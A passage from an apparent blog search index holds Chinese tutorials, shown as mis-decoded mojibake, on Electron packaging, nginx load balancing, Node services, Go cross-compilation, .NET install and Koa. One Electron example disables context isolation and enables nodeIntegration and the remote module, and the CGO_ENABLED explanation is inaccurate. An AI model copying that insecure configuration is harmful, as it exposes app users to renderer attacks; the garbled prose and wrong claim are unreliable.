ä»¥ä¸‹æ˜¯ä¸€ä¸ªåŸºæœ¬çš„ç¤ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•åœ¨ package.json ä¸­æ·»åŠ ä¸€ä¸ªè„šæœ¬æ¥æ‰“åŒ… Linux åº”ç”¨ï¼š 123&quot;scripts&quot;: &#123; &quot;package-linux&quot;: &quot;electron-packager . MyApp --platform=linux --arch=x64 --icon=icon.png&quot; &#125;, æ³¨æ„å‡ ä¸ªè¦ç‚¹ï¼š å¹³å°ï¼ˆâ€“platformï¼‰ï¼šè¿™é‡Œè®¾ç½®ä¸º linuxã€‚æ¶æ„ï¼ˆâ€“archï¼‰ï¼šæ ¹æ®ç›®æ ‡ Linux ç³»ç»Ÿï¼Œé€‰æ‹© x64 æˆ– ia32ã€‚å¦‚æœä¸ç¡®å®šï¼Œx64 æ˜¯æ›´å¸¸è§çš„é€‰æ‹©ï¼Œå› ä¸ºå¤§å¤šæ•°ç°ä»£ Linux å‘è¡Œç‰ˆéƒ½æ”¯æŒ 64 ä½åº”ç”¨ã€‚å›¾æ ‡ï¼ˆâ€“iconï¼‰ï¼šLinux ç³»ç»Ÿé€šå¸¸ä½¿ç”¨ PNG æˆ– SVG æ ¼å¼çš„å›¾æ ‡ï¼Œä½†è¯·æ³¨æ„ï¼Œå¹¶éæ‰€æœ‰ Linux æ¡Œé¢ç¯å¢ƒéƒ½ä¼šæ˜¾ç¤ºè¿™ä¸ªå›¾æ ‡ä½œä¸ºåº”ç”¨å›¾æ ‡ã€‚æœ‰äº›æ¡Œé¢ç¯å¢ƒï¼ˆå¦‚ GNOMEï¼‰å¯èƒ½è¦æ±‚åœ¨åº”ç”¨çš„ .desktop æ–‡ä»¶ä¸­æŒ‡å®šå›¾æ ‡ã€‚è·¯å¾„ï¼ˆ.ï¼‰ï¼š. è¡¨ç¤ºå½“å‰ç›®å½•ï¼Œå³ Electron åº”ç”¨çš„æ ¹ç›®å½•ã€‚åº”ç”¨åç§°ï¼ˆMyAppï¼‰ï¼šè¿™æ˜¯æ‰“åŒ…åç”Ÿæˆçš„æ–‡ä»¶å¤¹çš„åç§°ï¼Œä¹Ÿæ˜¯å¯æ‰§è¡Œæ–‡ä»¶çš„åç§°ï¼ˆä¸å¸¦ .exe åç¼€ï¼Œå› ä¸ºè¿™ä¸æ˜¯ Windowsï¼‰ã€‚è¿è¡Œæ‰“åŒ…å‘½ä»¤ï¼š 1npm run package-linux å¤åˆ¶åˆ° linuxæˆäºˆæƒé™~è¿è¡Œ æ‰“åŒ…mac~ 1&quot;package-mac&quot;: &quot;electron-packager . MyApp --platform=darwin --arch=x64&quot;, 8.è½½å…¥è¿œç¨‹data1. ä½¿ç”¨ CommonJS æ¨¡å—ï¼ˆé€‚ç”¨äº Node.js å’Œ Electron ç¯å¢ƒï¼‰ playlist å®šä¹‰åœ¨ä¸€ä¸ªå¤–éƒ¨æ–‡ä»¶ä¸­ï¼Œå¹¶é€šè¿‡ module.exports å¯¼å‡ºå®ƒã€‚ åˆ›å»º datajson.js æ–‡ä»¶ 1234567// datajson.jsconst playlist = [ &#123; name: &#x27;song1&#x27;, img: &#x27;/static/song1.jpg&#x27;, audio: &#x27;/static/song1.mp3&#x27;, lrc: &#x27;/static/song1.lrc&#x27; &#125;, &#123; name: &#x27;song2&#x27;, img: &#x27;/static/song2.jpg&#x27;, audio: &#x27;/static/song2.mp3&#x27;, lrc: &#x27;/static/song2.lrc&#x27; &#125;,];module.exports = playlist; // å¯¼å‡º playlist å˜é‡ 2: åœ¨ä¸»æ–‡ä»¶ä¸­å¯¼å…¥å¹¶ä½¿ç”¨ playlistç„¶ååœ¨ä½ çš„ renderer.js æ–‡ä»¶æˆ–å…¶ä»– JavaScript æ–‡ä»¶ä¸­é€šè¿‡ require å¼•å…¥è¯¥ playlistã€‚ 1234567// renderer.jsconst playlist = require(&#x27;./datajson.js&#x27;); // å¼•å…¥ datajson.js ä¸­çš„ playlistconsole.log(playlist); // æ‰“å°ä»¥éªŒè¯å¼•å…¥çš„æ•°æ®// ä½¿ç”¨ playlist è¿›è¡ŒéŸ³ä¹æ’­æ”¾å™¨çš„å…¶ä»–æ“ä½œ åœ¨ Electron çš„ä¸»è¿›ç¨‹ä¸­ï¼ˆé€šå¸¸æ˜¯ main.jsï¼‰è®¾ç½® nodeIntegration ä¸º trueï¼Œè¿™æ ·å°±å¯ä»¥åœ¨æ¸²æŸ“è¿›ç¨‹ä¸­ä½¿ç”¨ Node.js æ¨¡å—ï¼ˆåŒ…æ‹¬ requireï¼‰ã€‚ 12345678910111213141516171819// main.jsconst &#123; app, BrowserWindow &#125; = require(&#x27;electron&#x27;);function createWindow() &#123; const win = new BrowserWindow(&#123; width: 800, height: 600, webPreferences: &#123; nodeIntegration: true, // å¯ç”¨ nodeIntegration contextIsolation: false, // ç¦ç”¨ä¸Šä¸‹æ–‡éš”ç¦» enableRemoteModule: true // å¯ç”¨ remote æ¨¡å— (å¯é€‰) &#125; &#125;); win.loadFile(&#x27;index.html&#x27;);&#125;app.whenReady().then(createWindow); 9.è‡ªåŠ¨æ’­æ”¾ä¸‹ä¸€é¦–æ­Œæ›²123audioPlayer.addEventListener(&#x27;ended&#x27;, () =&gt; &#123; nextBtn.click(); // è°ƒç”¨ä¸‹ä¸€é¦–æŒ‰é’®ç‚¹å‡»äº‹ä»¶&#125;);","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"electron","slug":"electron","permalink":"https://banjinmei.github.io/tags/electron/"},{"name":"uniapp","slug":"uniapp","permalink":"https://banjinmei.github.io/tags/uniapp/"},{"name":"vue","slug":"vue","permalink":"https://banjinmei.github.io/tags/vue/"}],"author":"mu"},{"title":"nginx load balance","slug":"nginx","date":"2024-09-04T14:20:33.000Z","updated":"2024-09-04T14:26:58.000Z","comments":true,"path":"2024/09/04/nginx/","permalink":"https://banjinmei.github.io/2024/09/04/nginx/","excerpt":"","text":"Nginx Load Balance Proxyåå‘ä»£ç†ã€è´Ÿè½½å‡è¡¡ 1docker run --name nginx -p 8080:80 -d nginx è¿›å…¥nginxå®¹å™¨ 1Docker exec -it nginx bash nginx.confæ–‡ä»¶nginx.confåˆ†ä¸ºhttpå—ã€eventså—å’Œserverå—,æ­¤æ¬¡ä¸»è¦åœ¨serverå—ä¸­åšæ›´æ”¹. &#x2F;etc&#x2F;nginx&#x2F;nginx.confæœ«å°¾ include &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;*.conf; &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;default.conf 1234567891011121314151617upstream ServiceInstance&#123; #nginxé»˜è®¤è½®è¯¢ä¸‹é¢çš„æœåŠ¡å®ä¾‹ server ***.**.***.***:9007; server ***.**.***.***:9008; server ***.**.***.***:9009;&#125; server &#123;... location / &#123; #root /usr/share/nginx/html; #index index.html index.htm; #è¯·æ±‚åˆ°è¾¾åä¼šè¿›è¡Œè½¬å‘ proxy_pass http://ServiceInstance; &#125; ...&#125; æµè§ˆå™¨ä¸­è°ƒç”¨ä¸€ä¸ªæ¥å£æŸ¥çœ‹ è®¿é—®ä¸åŒçš„æœåŠ¡å®ä¾‹,è´Ÿè½½å‡è¡¡å°±å®ç°äº†ï¼ ä¹Ÿå¯ä»¥è®¾ç½®æƒé‡æ¯”ä¾‹,weightå€¼è¶Šå¤§,è¯·æ±‚åˆ°è¾¾æ­¤å®ä¾‹çš„æ¬¡æ•°å°±è¶Šå¤šï¼ upstream ServiceInstance&#123; #nginxé»˜è®¤è½®è¯¢ä¸‹é¢çš„æœåŠ¡å®ä¾‹ server ***.**.***.***:9007 weight=1; server ***.**.***.***:9008 weight=2; server ***.**.***.***:9009 weight=3; &#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"https://banjinmei.github.io/tags/nginx/"}],"author":"mu"},{"title":"node keep backend","slug":"node-keep-backend","date":"2024-08-30T17:52:41.000Z","updated":"2024-09-20T17:35:32.371Z","comments":true,"path":"2024/08/31/node-keep-backend/","permalink":"https://banjinmei.github.io/2024/08/31/node-keep-backend/","excerpt":"","text":"åœ¨ Debian ç³»ç»Ÿä¸Šè¿è¡Œ Node.js åº”ç”¨ç¨‹åºå¹¶ä½¿å…¶ä¿æŒå¸¸é©»è¿è¡Œæœ‰å‡ ç§æ–¹æ³• æ–¹æ³•ä¸€ï¼šä½¿ç”¨ systemd æœåŠ¡å¯ä»¥åˆ›å»ºä¸€ä¸ª .service æ–‡ä»¶æ¥å®šä¹‰ Node.js åº”ç”¨ç¨‹åºä½œä¸ºç³»ç»ŸæœåŠ¡ã€‚my-node-app 1sudo nano /etc/systemd/system/my-node-app.service ç¼–è¾‘æœåŠ¡æ–‡ä»¶ï¼šåœ¨æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹å†…å®¹ ï¼š 12345678910111213[Unit]Description=My Node.js ApplicationAfter=network.target[Service]User=your-usernameWorkingDirectory=/path/to/your/appExecStart=/usr/bin/node /path/to/your/app/index.jsRestart=alwaysEnvironment=NODE_ENV=production[Install]WantedBy=multi-user.target å¯åŠ¨å¹¶å¯ç”¨æœåŠ¡ï¼š 12sudo systemctl start my-node-appsudo systemctl enable my-node-app æ£€æŸ¥æœåŠ¡çŠ¶æ€ï¼š 1sudo systemctl status my-node-app æ–¹æ³•äºŒï¼šä½¿ç”¨ nohup å’Œ &amp;å¦‚æœä¸æƒ³ä½¿ç”¨ systemdï¼Œå¯ä»¥ä½¿ç”¨ nohup å‘½ä»¤æ¥ä¿æŒåº”ç”¨ç¨‹åºåœ¨åå°è¿è¡Œã€‚ å¯åŠ¨åº”ç”¨ç¨‹åºï¼š 1sudo nohup node /root/nodexxx/app.js &gt; outputapp3.log 2&gt;&amp;1 &amp; è¿™ä¼šå¯åŠ¨ Node.js åº”ç”¨ç¨‹åºï¼Œå¹¶å°†è¾“å‡ºå’Œé”™è¯¯é‡å®šå‘åˆ° app.log æ–‡ä»¶ä¸­ã€‚ æŸ¥çœ‹åå°è¿›ç¨‹ï¼š 1ps aux | grep node åœæ­¢åº”ç”¨ç¨‹åºï¼š 1pkill -f node æ–¹æ³•ä¸‰ï¼šä½¿ç”¨ screen æˆ– tmuxç»ˆç«¯å¤ç”¨å·¥å…·ï¼Œå¯ä»¥ä½¿ç”¨ screen æˆ– tmuxã€‚ å®‰è£… screenï¼ˆå¦‚æœå°šæœªå®‰è£…ï¼‰ï¼š1sudo apt-get install screen åˆ›å»ºä¸€ä¸ªæ–°çš„ screen ä¼šè¯ï¼š 1screen -S my-node-app åœ¨ screen ä¸­å¯åŠ¨åº”ç”¨ç¨‹åºï¼š 1node /path/to/your/app/index.js åˆ†ç¦» screen ä¼šè¯ï¼šæŒ‰ä¸‹ Ctrl+Aï¼Œç„¶åæŒ‰ä¸‹ Dã€‚ é‡æ–°é™„åŠ åˆ° screen ä¼šè¯ï¼š 1screen -r my-node-app å®‰è£… tmuxï¼ˆå¦‚æœæœªå®‰è£…ï¼‰1sudo apt-get install tmux å¯åŠ¨ä¸€ä¸ª tmux ä¼šè¯ï¼š 1tmux new -s my_node_app åœ¨é‡Œé¢è¿è¡Œ Node.js åº”ç”¨ç¨‹åºï¼š 1node your_app.js æŒ‰ä¸‹ Ctrl+Bï¼Œç„¶åæŒ‰ D é”®åˆ†ç¦» tmuxã€‚å¯ä»¥éšæ—¶é‡æ–°è¿æ¥åˆ°è¿™ä¸ªä¼šè¯ï¼š 1tmux attach -t my_node_app","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"node","slug":"node","permalink":"https://banjinmei.github.io/tags/node/"}],"author":"mu"},{"title":"win bilud go 4 linux","slug":"win-bilud-go-4-linux","date":"2024-08-25T16:58:39.000Z","updated":"2024-12-07T18:17:32.477Z","comments":true,"path":"2024/08/26/win-bilud-go-4-linux/","permalink":"https://banjinmei.github.io/2024/08/26/win-bilud-go-4-linux/","excerpt":"","text":"1. å®‰è£…å¿…è¦çš„å·¥å…·å’Œä¾èµ–é¦–å…ˆï¼Œç¡®ä¿ä½ å·²ç»å®‰è£…äº†Goç¼–è¯‘å™¨å’ŒVS Codeã€‚å¦‚æœè¿˜æ²¡æœ‰å®‰è£…Goï¼Œå¯ä»¥ä»å®˜æ–¹ç½‘ç«™ä¸‹è½½å¹¶å®‰è£…ã€‚ 2. é…ç½®Goç¯å¢ƒæ‰“å¼€VS Codeï¼ŒæŒ‰ Ctrl + Shift + P æ‰“å¼€å‘½ä»¤é¢æ¿ï¼Œè¾“å…¥ â€œshellâ€ é€‰æ‹© â€œShell: Windowsâ€ æˆ– â€œShell: Linuxâ€ åˆ›å»ºä¸€ä¸ªæ–°çš„Goé¡¹ç›® åœ¨VS Codeä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶å¤¹ä½œä¸ºä½ çš„Goé¡¹ç›®ç›®å½•ï¼Œç„¶ååœ¨ç»ˆç«¯ä¸­å¯¼èˆªåˆ°è¯¥ç›®å½•å¹¶åˆå§‹åŒ–ä¸€ä¸ªæ–°çš„Goé¡¹ç›®ï¼š 12345mkdir my-go-appcd my-go-appgo mod init my-go-apptouch main.go 4. ç¼–å†™Goç¨‹åºåœ¨ main.go æ–‡ä»¶ä¸­ç¼–å†™ä¸€ä¸ªç®€å•çš„Hello Worldç¨‹åºï¼š 12345678package mainimport &quot;fmt&quot;func main() &#123; fmt.Println(&quot;Hello, World!&quot;)&#125; 5. å®‰è£…äº¤å‰ç¼–è¯‘å·¥å…· â­Goæä¾›äº†ä¸€äº›å·¥å…·æ¥è¿›è¡Œè·¨å¹³å°ç¼–è¯‘ã€‚ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å®‰è£…è¿™äº›å·¥å…·ï¼š 123go install github.com/golang/tools/cmd/goimports@latestgo install golang.org/x/lint/golint@latestgo install github.com/cweill/gotests/...@latest 6. é…ç½®VS Codeä»¥ä½¿ç”¨Linuxç¯å¢ƒä½ éœ€è¦ä¸€ä¸ªLinuxç¯å¢ƒæ¥è¿›è¡Œäº¤å‰ç¼–è¯‘ã€‚Windows Subsystem for Linux (WSL)æ¥å®ç°ã€‚(https://learn.microsoft.com/zh-cn/windows/wsl/install?source=recommendations) 1wsl --install æ‰©å±• Remoto Development å·¦ä¾§ä¼šå‡ºç°Remote Explorer Tabï¼Œåœ¨è¿™ä¸ªtabä¸‹å¯ä»¥åˆ‡æ¢wsl target + åœ¨VS Codeä¸­ï¼Œæ‰“å¼€ç»ˆç«¯ï¼Œç„¶åé€‰æ‹©â€œWSL: Ubuntuâ€æˆ–å…¶ä»–å®‰è£…çš„Linuxå‘è¡Œç‰ˆã€‚ 7. ç¼–è¯‘æˆLinuxå¯æ‰§è¡Œç¨‹åºåœ¨ç»ˆç«¯ä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥ç¼–è¯‘ä½ çš„Goç¨‹åºï¼š 1CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o my-go-app-linux main.go è¿™é‡Œçš„ CGO_ENABLED&#x3D;0 æ˜¯å¿…è¦çš„ï¼Œå› ä¸ºé»˜è®¤æƒ…å†µä¸‹Goä¼šä½¿ç”¨cgoæ¥è¿›è¡Œä¸€äº›ç³»ç»Ÿè°ƒç”¨ï¼Œè€ŒLinuxå¹¶ä¸æ”¯æŒè¿™äº›è°ƒç”¨ã€‚ 1234go build -o YourProgramName -ldflags &quot;-s -w&quot; --buildmode=exe -o out/linux/YourProgramName main.gogo build -o Fs -ldflags &quot;-s -w&quot; --buildmode=exe main.go ubuntu go lang setup123wget https://go.dev/dl/go1.17.3.linux-amd64.tar.gz(SUDO) tar -C /usr/local -xzf go1.17.3.linux-amd64.tar.gz 8. æµ‹è¯•ä½ çš„å¯æ‰§è¡Œç¨‹åºç¼–è¯‘å®Œæˆåï¼Œä½ å¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥æ£€æŸ¥ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼š 1./my-go-app-linux â€œHello, World!â€ 9. æ‰“åŒ…å’Œåˆ†å‘ï¼ˆå¯é€‰ï¼‰Goç¨‹åºæ‰“åŒ…å¹¶åˆ†å‘åˆ°LinuxæœåŠ¡å™¨ä¸Šï¼Œå¯ä»¥ä½¿ç”¨taræˆ–scpç­‰å·¥å…·æ¥ä¼ è¾“æ–‡ä»¶ 12tar -czvf my-go-app-linux.tar.gz my-go-app-linuxscp my-go-app-linux.tar.gz user@remote-server:/path/to/destination åˆ‡æ¢win&#x2F;linuxæ‰“åŒ…windowä¸‹å¦‚ä½•æ‰“åŒ…æˆexeæ–‡ä»¶ï¼Œå¹¶è¿è¡Œã€‚ æ‰“å¼€golandï¼Œç‚¹å‡»Terminal ç»ˆç«¯ è¾“å…¥æŒ‡ä»¤ï¼š 1go env æŸ¥çœ‹ GOOSæ˜¯å¦windows windowsæ‰§è¡ŒæŒ‡ä»¤ï¼š 1go env -w GOOS=windows æ¥ä¸‹æ¥è¿è¡Œ 1go build main.go å‘ç°é¡¹ç›®ç›®å½•å¤šäº†ä¸€ä¸ª main.exeçš„æ–‡ä»¶ï¼Œè¿™ä¸ªå°±æ˜¯æ ¹æ®é¡¹ç›®ç”Ÿæˆçš„ exeæ–‡ä»¶ã€‚ windowä¸‹å¦‚ä½•æ‰§è¡Œ main.exe å‘¢ï¼Ÿæ‰“å¼€ cmd å‘½ä»¤è¡Œ è¿›å…¥åˆ° main.exe æ‰€åœ¨çš„ç›®å½•ï¼Œè¾“å…¥ main.exe å³å¯ çœ‹åˆ°å·²ç»è¾“å‡ºäº† hello ! linuxæ‰§è¡ŒæŒ‡ä»¤ä¿®æ”¹ä¸ºlinuxï¼š 1go env -w GOOS=linux æ¥ä¸‹æ¥è¿è¡Œ 1go build main.go å‘ç°é¡¹ç›®ç›®å½•å¤šäº†ä¸€ä¸ª mainçš„æ–‡ä»¶ï¼Œè¿™ä¸ªå°±æ˜¯æ ¹æ®é¡¹ç›®ç”Ÿæˆçš„ linuxä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶ é‚£ä¹ˆå¦‚ä½•åœ¨linuxä¸‹æ‰§è¡Œ main å‘¢ï¼Ÿ å°†mainä¸Šä¼ åˆ° linuxç³»ç»Ÿçš„ &#x2F;homeç›®å½•ã€‚ ç¡®ä¿å·²ç»å®‰è£…ä¸Šgoç¯å¢ƒï¼Œä½¿ç”¨ go version çœ‹ä¸€ä¸‹ èƒ½å¤Ÿè¾“å‡ºï¼Œè¯´æ˜å·²ç»å®‰è£…å¥½äº†go ä¸ºmainæ·»åŠ å¯æ‰§è¡Œæƒé™ 1chmod +x main æ‰§è¡Œmainç¨‹åºï¼š 1./main å¯ä»¥çœ‹åˆ°è¾“å‡º hello !","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://banjinmei.github.io/tags/linux/"},{"name":"debian","slug":"debian","permalink":"https://banjinmei.github.io/tags/debian/"},{"name":"go","slug":"go","permalink":"https://banjinmei.github.io/tags/go/"}],"author":"mu"},{"title":"Anolis8.4 .NET","slug":"Anolis8-4-NET","date":"2024-08-25T02:03:23.000Z","updated":"2024-12-09T15:25:01.475Z","comments":true,"path":"2024/08/25/Anolis8-4-NET/","permalink":"https://banjinmei.github.io/2024/08/25/Anolis8-4-NET/","excerpt":"","text":"Anolis8.4 åŒ…ç®¡ç†å™¨ä¸º yumã€‚ æ‰“å¼€ç»ˆç«¯æˆ–å‘½ä»¤æç¤ºç¬¦çª—å£ï¼Œå¹¶åˆ‡æ¢åˆ° root ç”¨æˆ·ã€‚ æ·»åŠ  Microsoft åŒ…æºã€‚ 12wget https://packages.microsoft.com/config/centos/8/packages-microsoft-prod.repo -O /etc/yum.repos.d/packages-microsoft-prod.repo å®‰è£….NET 8 SDKã€‚ 1sudo yum install dotnet-sdk-8.0 è¿è¡Œæ—¶ 1sudo yum install dotnet-runtime-8.0 å®‰è£…å®Œæˆåï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤éªŒè¯.NET 8 æ˜¯å¦å·²æˆåŠŸå®‰è£…ã€‚ 1dotnet --version test 123dotnet new console -o HelloWorldcd HelloWorlddotnet run","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"anolis","slug":"anolis","permalink":"https://banjinmei.github.io/tags/anolis/"}],"author":"mu"},{"title":"node koa","slug":"node-koa","date":"2024-08-19T15:57:00.000Z","updated":"2024-08-19T16:00:34.000Z","comments":true,"path":"2024/08/19/node-koa/","permalink":"https://banjinmei.github.io/2024/08/19/node-koa/","excerpt":"","text":"koaKoa æ˜¯ä¸€ä¸ªç”± Express åŸç­äººé©¬æ‰“é€ çš„æ–°çš„ Web æ¡†æ¶ï¼Œæ—¨åœ¨æä¾›æ›´å°ã€æ›´å¯Œè¡¨ç°åŠ›ã€æ›´å¥å£®çš„æœåŠ¡å™¨å¤„ç†é€»è¾‘ã€‚å®ƒä½¿ç”¨ ES6 çš„æ–°ç‰¹æ€§ï¼Œå¦‚ Promises å’Œ generatorsï¼Œæ¥ç®€åŒ–å¼‚æ­¥æµç¨‹æ§åˆ¶ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å…³äº Koa çš„å…³é”®ç‚¹ï¼š ç‰¹ç‚¹è½»é‡çº§ï¼šKoa çš„æ ¸å¿ƒä»£ç éå¸¸ç²¾ç®€ï¼Œæ²¡æœ‰æ†ç»‘å¾ˆå¤šä¸­é—´ä»¶ï¼Œè¿™ä½¿å¾—å®ƒçš„å¯åŠ¨é€Ÿåº¦å¿«ã€ä½“ç§¯å°ã€‚ ç®€æ´çš„ä¸­é—´ä»¶ç³»ç»Ÿï¼šKoa ä½¿ç”¨åŸºäº Promise çš„ä¸­é—´ä»¶æ¨¡å‹ï¼Œè¿™ä¸ªæ¨¡å‹å…è®¸ä½ é€šè¿‡ async&#x2F;await æ¥ç¼–å†™å¼‚æ­¥ä»£ç ï¼Œå¹¶ä¸”å¯ä»¥æ–¹ä¾¿åœ°åœ¨ä¸­é—´ä»¶ä¹‹é—´å…±äº«é€»è¾‘ã€‚ **å¼ºå¤§çš„ä¸Šä¸‹æ–‡å¯¹è±¡ (Context)**ï¼šæ¯ä¸ªè¯·æ±‚éƒ½æœ‰ä¸€ä¸ª context å¯¹è±¡ï¼Œå®ƒåŒ…å«äº† request å’Œ response çš„æ‰€æœ‰ä¿¡æ¯ï¼Œç®€åŒ–äº†å¤„ç† HTTP æ¶ˆæ¯çš„æµç¨‹ã€‚ é”™è¯¯å¤„ç†ï¼šKoa é€šè¿‡ç»Ÿä¸€çš„é”™è¯¯å¤„ç†æœºåˆ¶æ¥ç®€åŒ–é”™è¯¯å¤„ç†è¿‡ç¨‹ï¼Œä½ å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹æŠ›å‡ºé”™è¯¯ï¼Œå¹¶åœ¨åº”ç”¨çš„é¡¶å±‚æ•è·å®ƒä»¬ã€‚ å†…ç½®æ”¯æŒ async&#x2F;awaitï¼šç”±äº Koa åŸºäº ES6 çš„æ–°ç‰¹æ€§ï¼Œæ‰€æœ‰çš„å¤„ç†å‡½æ•°é»˜è®¤éƒ½æ˜¯å¼‚æ­¥çš„ï¼Œä½ å¯ä»¥ä½¿ç”¨ async&#x2F;await æ¥ç¼–å†™æ›´ç®€æ´å’Œç›´è§‚çš„ä»£ç ã€‚ 123nvm install 7npm i koanode my-koa-app.js 123456789101112131415161718192021222324const Koa = require(&#x27;koa&#x27;);const app = new Koa();// loggerapp.use(async (ctx, next) =&gt; &#123; await next(); // è°ƒç”¨ä¸‹ä¸€ä¸ªä¸­é—´ä»¶ const rt = ctx.response.get(&#x27;X-Response-Time&#x27;); console.log(`$&#123;ctx.method&#125; $&#123;ctx.url&#125; - $&#123;rt&#125;`);&#125;);// x-response-timeapp.use(async (ctx, next) =&gt; &#123; const start = Date.now(); await next(); // è°ƒç”¨ä¸‹ä¸€ä¸ªä¸­é—´ä»¶ const ms = Date.now() - start; ctx.set(&#x27;X-Response-Time&#x27;, `$&#123;ms&#125;ms`);&#125;);// responseapp.use(async ctx =&gt; &#123; ctx.body = &#x27;Hello World&#x27;;&#125;);app.listen(3000); åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸¤ä¸ªä¸­é—´ä»¶æ¥è®°å½•è¯·æ±‚çš„æ—¶é—´å’Œæ—¥å¿—ã€‚ctx å¯¹è±¡åŒ…å«äº†æ‰€æœ‰çš„ HTTP è¯·æ±‚ä¿¡æ¯ï¼Œä½ å¯ä»¥é€šè¿‡å®ƒè®¿é—® request å’Œ responseã€‚ è·¯ç”±Koa æœ¬èº«ä¸åŒ…å«å†…ç½®çš„è·¯ç”±ç³»ç»Ÿï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ç¬¬ä¸‰æ–¹ä¸­é—´ä»¶å¦‚ koa-router æ¥å®ç°çµæ´»çš„è·¯ç”±åŠŸèƒ½ã€‚ 1234567891011121314151617181920//npm i koa-routerconst Koa = require(&#x27;koa&#x27;);const Router = require(&#x27;koa-router&#x27;);const app = new Koa();const router = new Router();router.get(&#x27;/&#x27;, (ctx, next) =&gt; &#123; ctx.body = &#x27;Hello World&#x27;;&#125;);router.get(&#x27;/users/:id&#x27;, (ctx, next) =&gt; &#123; const id = ctx.params.id; ctx.body = `User ID: $&#123;id&#125;`;&#125;);app.use(router.routes()).use(router.allowedMethods());app.listen(3011); http://localhost:3011/http://localhost:3011/users/1 err code: â€˜MODULE_NOT_FOUNDâ€™delete node_modules 12npm i ä¸­é—´ä»¶Koa çš„å¼ºå¤§ä¹‹å¤„åœ¨äºå…¶çµæ´»çš„ä¸­é—´ä»¶ç³»ç»Ÿã€‚é€šè¿‡ç¼–å†™è‡ªå®šä¹‰çš„ä¸­é—´ä»¶æ¥å¤„ç†è¯·æ±‚å’Œå“åº”ï¼Œç”šè‡³å¯ä»¥ä¿®æ”¹ ctx å¯¹è±¡ 1234567891011121314151617181920212223const Koa = require(&#x27;koa&#x27;);const app = new Koa();app.use(async (ctx, next) =&gt; &#123; console.log(&#x27;First middleware start&#x27;); await next(); // è°ƒç”¨ä¸‹ä¸€ä¸ªä¸­é—´ä»¶ console.log(&#x27;First middleware end&#x27;);&#125;);app.use(async (ctx, next) =&gt; &#123; console.log(&#x27;Second middleware start&#x27;); ctx.state.user = &#123; name: &#x27;John Doe&#x27; &#125;; // è®¾ç½®ä¸€äº›çŠ¶æ€ await next(); // è°ƒç”¨ä¸‹ä¸€ä¸ªä¸­é—´ä»¶ console.log(&#x27;Second middleware end&#x27;);&#125;);app.use(async (ctx) =&gt; &#123; console.log(&#x27;Third middleware start&#x27;); ctx.body = `Hello, $&#123;ctx.state.user.name&#125;`; console.log(&#x27;Third middleware end&#x27;);&#125;);app.listen(3012); koa-compose è¿›è¡Œä¸­é—´ä»¶ç»„åˆKoa æä¾›äº†ä¸€ä¸ªå†…ç½®çš„æ–¹æ³• koa-compose æ¥å°†å¤šä¸ªä¸­é—´ä»¶ç»„åˆæˆä¸€ä¸ªä¸­é—´ä»¶å‡½æ•°ã€‚è¿™ä½¿å¾—ç®¡ç†å¤æ‚çš„ä¸­é—´ä»¶å †æ ˆå˜å¾—æ›´åŠ å®¹æ˜“ã€‚ 12345678910111213141516171819202122232425262728const Koa = require(&#x27;koa&#x27;);const compose = require(&#x27;koa-compose&#x27;);const app = new Koa();const middleware1 = async (ctx, next) =&gt; &#123; console.log(&#x27;Middleware 1 start&#x27;); await next(); console.log(&#x27;Middleware 1 end&#x27;);&#125;;const middleware2 = async (ctx, next) =&gt; &#123; console.log(&#x27;Middleware 2 start&#x27;); ctx.state.user = &#123; name: &#x27; koacom &#x27; &#125;; await next(); console.log(&#x27;Middleware 2 end&#x27;);&#125;;const middleware3 = async (ctx) =&gt; &#123; console.log(&#x27;Middleware 3 start&#x27;); ctx.body = `Hello, $&#123;ctx.state.user.name&#125;`; console.log(&#x27;Middleware 3 end&#x27;);&#125;;const allMiddlewares = compose([middleware1, middleware2, middleware3]);app.use(allMiddlewares);app.listen(3020); koa-bodyparserkoa-statickoa-loggerkoa-session Koa æ˜¯ä¸€ä¸ªç°ä»£çš„ã€é«˜æ•ˆèƒ½çš„ Web æ¡†æ¶ï¼Œå®ƒåˆ©ç”¨æœ€æ–°çš„ JavaScript ç‰¹æ€§æ¥ç®€åŒ–å¼‚æ­¥ç¼–ç¨‹å’Œä¸­é—´ä»¶é€»è¾‘ã€‚å®ƒçš„è½»é‡çº§è®¾è®¡è®©å®ƒéå¸¸é€‚åˆæ„å»ºå°å‹åˆ°ä¸­å‹çš„åº”ç”¨ã€‚å¦‚æœä½ æ­£åœ¨å¯»æ‰¾ä¸€ä¸ªæ›´ç®€æ´ã€é«˜æ•ˆçš„ Node.js Web æ¡†æ¶ï¼ŒKoa 